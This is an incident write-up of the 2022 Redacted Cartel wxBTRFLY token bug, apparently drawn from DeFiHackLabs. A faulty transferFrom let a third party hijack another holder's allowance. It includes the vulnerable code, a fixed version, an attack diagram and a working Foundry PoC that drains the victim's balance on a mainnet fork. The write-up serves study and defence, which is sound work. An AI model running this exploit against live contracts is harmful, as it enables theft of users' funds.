# Redacted Cartel — transferFrom Allowance Bug (Recipient Allowance Hijacking) Analysis

| Field | Details |
|------|------|
| **Date** | 2022-03-19 |
| **Protocol** | Redacted Cartel (wxBTRFLY token) |
| **Chain** | Ethereum Mainnet |
| **Loss** | 89,011,248,549,237,373,700 wxBTRFLY (Alice's entire holdings) |
| **Attacker** | Bob [0x78186702Bd66905845B469E3b76d4FD63F8722d4](https://etherscan.io/address/0x78186702Bd66905845B469E3b76d4FD63F8722d4) |
| **Victim** | Alice [0x9ee1873ba8383B1D4ac459aBd3c9C006Eaa8800A](https://etherscan.io/address/0x9ee1873ba8383B1D4ac459aBd3c9C006Eaa8800A) |
| **Vulnerable Contract** | wxBTRFLY [0x186E55C0BebD2f69348d94C4A27556d93C5Bd36C](https://etherscan.io/address/0x186E55C0BebD2f69348d94C4A27556d93C5Bd36C) |
| **Root Cause** | In `transferFrom()`, `_approve()` incorrectly uses `recipient` instead of `msg.sender` as the spender, allowing a third party to hijack the allowance |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-03/RedactedCartel_exp.sol) |

---
## 1. Vulnerability Overview

The `transferFrom()` implementation in the wxBTRFLY token contained a critical bug in its allowance deduction logic. Per the EIP-20 standard, a call to `transferFrom(sender, recipient, amount)` must deduct `amount` from the `sender → msg.sender` allowance.

However, Redacted Cartel's implementation contained the following erroneous code:

```
_approve(sender, msg.sender, allowance(sender, recipient).sub(amount))
```

`allowance(sender, recipient)`: the allowance that `sender` granted to `recipient`
`_approve(sender, msg.sender, ...)`: effectively grants `msg.sender` a new allowance equal to the `sender→recipient` allowance

By exploiting this bug, Bob copied the allowance Alice had granted to AliceContract into his own allowance with a single zero-token transfer transaction.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable wxBTRFLY.transferFrom() (actual bug)
function transferFrom(
    address sender,
    address recipient,
    uint256 amount
) public virtual override returns (bool) {
    _transfer(sender, recipient, amount);

    // ❌ Core bug: uses recipient as the spender
    // Correct code: allowance(sender, msg.sender).sub(amount)
    // Buggy code:   allowance(sender, recipient).sub(amount)
    //              → sets a new allowance for msg.sender equal to sender→recipient allowance
    _approve(
        sender,
        msg.sender,
        allowance(sender, recipient).sub(   // ← recipient (bug!)
            amount,
            "ERC20: transfer amount exceeds allowance"
        )
    );
    return true;
}

// ✅ Correct EIP-20 transferFrom
function transferFrom(
    address sender,
    address recipient,
    uint256 amount
) public virtual override returns (bool) {
    _transfer(sender, recipient, amount);

    uint256 currentAllowance = allowance(sender, msg.sender); // ✅ msg.sender
    require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
    unchecked {
        _approve(sender, msg.sender, currentAllowance - amount);
    }
    return true;
}
```

---
### On-Chain Original Code

Source: Sourcify verified


**WXBTRFLY.sol** — entry point:
```solidity
// ❌ Root cause: in `transferFrom()`, `_approve()` incorrectly uses `recipient` instead of `msg.sender` as the spender, allowing a third party to hijack the allowance
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);  // ❌ unauthorized transferFrom

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.

    function _approve(address owner, address spender, uint256 amount) internal virtual {  // ❌ vulnerability
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
```

## 3. Attack Flow (ASCII Diagram)

```
Initial State:
  Alice → AliceContract: approve(89,011,248,549,237,373,700 wxBTRFLY)
  Alice → Bob: approve(0)

Bob's Attack:
    │
    ├─[1] wxBTRFLY.transferFrom(Alice, AliceContract, 0)
    │       sender    = Alice
    │       recipient = AliceContract
    │       amount    = 0
    │       msg.sender = Bob
    │
    ├─[2] Internal processing:
    │       _transfer(Alice, AliceContract, 0) → 0 tokens moved
    │       allowance(Alice, AliceContract) = 89,011,248,549,237,373,700
    │       ❌ _approve(Alice, Bob, 89,011,248,549,237,373,700 - 0)
    │              → All of Alice's wxBTRFLY allowance is copied to Bob!
    │
    └─[3] wxBTRFLY.transferFrom(Alice, Bob, 89,011,248,549,237,373,700)
            Bob drains Alice's entire token balance
            (now possible because Bob holds the allowance)
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";

interface IwxBTRFLY is IERC20 {
    function unFreezeToken() external;
}

contract ContractTest is Test {
    IwxBTRFLY wxBTRFLY =
        IwxBTRFLY(0x186E55C0BebD2f69348d94C4A27556d93C5Bd36C);

    address alice        = 0x9ee1873ba8383B1D4ac459aBd3c9C006Eaa8800A;
    address aliceContract = 0x0f41d34B301E24E549b7445B3f620178bff331be;
    address bob          = 0x78186702Bd66905845B469E3b76d4FD63F8722d4;
    address owner        = 0x20B92862dcb9976E0AA11fAE766343B7317aB349;

    function setUp() public {
        vm.createSelectFork("mainnet", 13_908_185);
    }

    function testExploit() public {
        // [Setup] Unfreeze token
        vm.prank(owner);
        wxBTRFLY.unFreezeToken();

        // Verify initial state
        emit log_named_uint(
            "[Before] Alice → AliceContract allowance",
            wxBTRFLY.allowance(alice, aliceContract)
        );
        emit log_named_uint(
            "[Before] Alice → Bob allowance",
            wxBTRFLY.allowance(alice, bob)
        );

        // [Attack] Bob calls transferFrom with 0 tokens
        // ⚡ Bug: allowance(sender=Alice, recipient=AliceContract) is used in
        //          _approve(Alice, msg.sender=Bob, ...)
        //          → Bob acquires Alice→AliceContract allowance
        vm.prank(bob);
        wxBTRFLY.transferFrom(alice, aliceContract, 0);

        emit log_named_uint(
            "[After] Alice → Bob allowance (allowance copied!)",
            wxBTRFLY.allowance(alice, bob)
        );

        // [Drain] Bob transfers Alice's entire token balance using his new allowance
        uint256 stolenAmount = wxBTRFLY.allowance(alice, bob);
        vm.prank(bob);
        wxBTRFLY.transferFrom(alice, bob, stolenAmount);

        emit log_named_uint(
            "[Stolen] Bob wxBTRFLY balance",
            wxBTRFLY.balanceOf(bob)
        );
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | ERC20 Implementation Error (Incorrect ERC20 Implementation) |
| **CWE** | CWE-284: Improper Access Control |
| **OWASP DeFi** | Token Standard Incorrect Implementation |
| **Attack Vector** | transferFrom(alice, aliceContract, 0) → Bob acquires allowance without authorization |
| **Precondition** | Alice has set an allowance for AliceContract |
| **Impact** | Alice's entire token balance can be drained |

---
## 6. Remediation Recommendations

1. **EIP-20 Standard Compliance**: Allowance deduction inside `transferFrom` must always use `allowance(sender, msg.sender)`.
2. **Use OpenZeppelin Library**: Use the audited ERC20 implementation as-is, or strictly adhere to the standard when overriding.
3. **Mandatory Unit Tests**: Explicitly test edge cases such as zero-amount transfers and third-party allowance queries.
4. **Priority Audit Items**: For custom ERC20 implementations, focus audits on the `transfer`, `transferFrom`, and `approve` functions.

---
## 7. Lessons Learned

- **Risk of Custom ERC20 Implementations**: When overriding or rewriting OpenZeppelin's standard implementation, even a tiny typo can have catastrophic consequences.
- **Complexity of the Allowance Mechanism**: The roles of the three addresses — `sender`, `recipient`, and `msg.sender` — must be clearly distinguished.
- **Zero-Amount Transactions**: A zero-token transfer is cheap to execute, but as this vulnerability demonstrates, it can trigger state changes.
- **Code Review**: `allowance(sender, recipient)` vs `allowance(sender, msg.sender)` — a one-word difference brought down the entire security model.